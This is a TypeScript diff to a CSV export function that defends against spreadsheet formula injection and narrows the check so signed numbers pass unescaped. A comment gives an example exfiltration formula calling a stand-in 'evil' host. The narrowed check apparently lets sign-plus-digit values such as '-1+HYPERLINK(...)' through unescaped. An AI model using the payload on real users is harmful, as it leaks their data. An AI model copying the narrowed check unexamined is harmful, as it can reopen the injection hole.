@@ -33,22 +33,44 @@ function asString(value: unknown): string {
 
 /** Quote-and-escape one CSV cell. Always-quote keeps the encoder dead simple.
  *
- * F-22 (security audit 2026-05-25) — prefix cells starting with one of
- * the spreadsheet "formula triggers" (= + - @ \t \r) with a single
- * quote so Excel / Numbers / Sheets treat them as literal text
- * instead of executing them. A household member with edit access
- * could otherwise drop e.g. `=HYPERLINK("http://evil/?leak="&A1&B1)`
- * into a transaction description that gets exfiltrated when the
- * admin exports a CSV for taxes and opens it in Excel.
+ * F-22 (security audit 2026-05-25) — prefix cells starting with a
+ * spreadsheet "formula trigger" with a single quote so Excel /
+ * Numbers / Sheets treat them as literal text instead of executing
+ * them. Example threat: a household member with edit access drops
+ * `=HYPERLINK("http://evil/?leak="&A1&B1)` into a transaction
+ * description that gets exfiltrated when the admin exports a CSV for
+ * taxes and opens it in Excel.
+ *
+ * Refined 2026-05-25 re-audit: `=` `@` `\t` `\r` are always-dangerous,
+ * but `-` and `+` are also legitimate signed-number prefixes ("-40.00"
+ * is a number, not a formula). To keep negative amounts numerically
+ * sortable in the exported sheet, we ONLY prefix when `-`/`+` is
+ * followed by a non-digit-and-non-dot character.
  */
 function csvCell(value: unknown): string {
   if (value === null || value === undefined) return '""';
   let s = String(value);
-  if (s.length > 0 && /^[=+\-@\t\r]/.test(s)) {
+  if (s.length > 0 && isCsvFormulaInjection(s)) {
     s = `'${s}`;
   }
   s = s.replace(/"/g, '""');
   return `"${s}"`;
+}
+
+function isCsvFormulaInjection(s: string): boolean {
+  const first = s.charCodeAt(0);
+  // = @ \t \r — always dangerous; no legitimate non-formula use as a leading char.
+  if (first === 0x3d || first === 0x40 || first === 0x09 || first === 0x0d) return true;
+  // - + — also formula triggers, but allow a leading sign that's followed
+  // by a digit or decimal point (signed-number values).
+  if (first === 0x2d || first === 0x2b) {
+    if (s.length === 1) return false; // bare "-" or "+" — let it through
+    const second = s.charCodeAt(1);
+    const secondIsDigit = second >= 0x30 && second <= 0x39;
+    const secondIsDot = second === 0x2e;
+    return !(secondIsDigit || secondIsDot);
+  }
+  return false;
 }
 
 /** Format integer cents as a fixed-2 decimal string. */
